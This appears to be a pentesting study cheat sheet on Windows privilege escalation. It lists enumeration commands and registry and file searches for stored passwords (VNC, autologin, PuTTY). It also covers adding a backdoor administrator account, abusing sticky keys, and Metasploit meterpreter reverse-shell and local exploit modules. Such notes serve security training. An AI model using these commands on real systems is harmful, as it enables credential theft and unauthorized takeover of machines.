# Windows Privilege Escalation

## Enumeration 

- Lists the privileges the current user has
```
whoami /priv
```

- Displays the entire system information 
- Also lists hoifixes
`systeminfo`

- lists all the registered users 
```bash
net users

# detailed information of a particular user
net user user1
```

- lists the available file shares
`net share`

- display arp table
`arp -a`

- firewall status
`netsh advfirewall show`

- display all internal processes
`netstat -ano`

## WMI Queries (Window Management Instrumentation)

- Queries are written in **WQL**
- Windows 7,8,10 have WMI enabled by default

## Searching for credentials

### Unattend files -> used for customizing windows iso
- Some softwares/instructions require administrator privileges to run
- To find the unattend text files
```
dir unattend.* /s
```

### sysprep files
- Finding sysprep files 
```
dir sysprep.* /s
```

### Listing files that contain the string 'password'
```
findstr /si "password" *.txt *.ini
```
/s -> recursive search
/i -> ignore case

### checking registry for stored passwords

```
# VNC 
reg query "HKCU\Software\ORL\WinVNC3\Password"

# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# SNMP Parameter
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

### at command and sticky keys
**at command is deprecated in Windows 10**
- at command runs a service as an Administrator
- set the full path of the command you wish to run
`at 12:34 C:\someprogram.exe`
- to delete at jobs
`at /delete`

**Adding another user**
`net user /add terminator password-terminator`

**Adding to administrator group**
`net localgroup administrators /add terminator`

- `sethc` is run when Shift key is pressed 5 times and sticky key is turned on
- we can alter the contents of this file to run a script when sticky keys are triggered

### Metasploit modules
1. Create a meterpreter payload using msfvenom 
2. use exploit/multi/handler
3. set payload windows/meterpreter/reverse_tcp 
4. set other options
5. background the current session 

setting the session to 1 as a global variable
`setg SESSION 1`

**checking if the target is running on a VM**
1. search checkvm 
2. use 2

**enumerate all applications installed on the target machine**
1. search enum_app 
2. use 0 
3. set the session id and run
4. check for exploits for applications

**enumerating IE/Chrome**
1. search enum_ie/enum_chrome
2. use 0
3. run 

**enumerating snmp**

**enumerating shares**
1. search enum_shares

**enumerating logged in uses**
1. search enum_logged_on_users

**gpp (useful for AD)**
1. seearch gpp 
2. use 3

**enumerate service permissions**
- Gives a reverse shell if it finds any writeable services
`search service_permissions`
- opens an NT AUTHORITY\SYSTEM session

**local exploit suggester**
`search local_exploit`
- lists the exploits the target is vulnerable to
`use <exploit>`
- if the exploit is successful we get a reverse shell

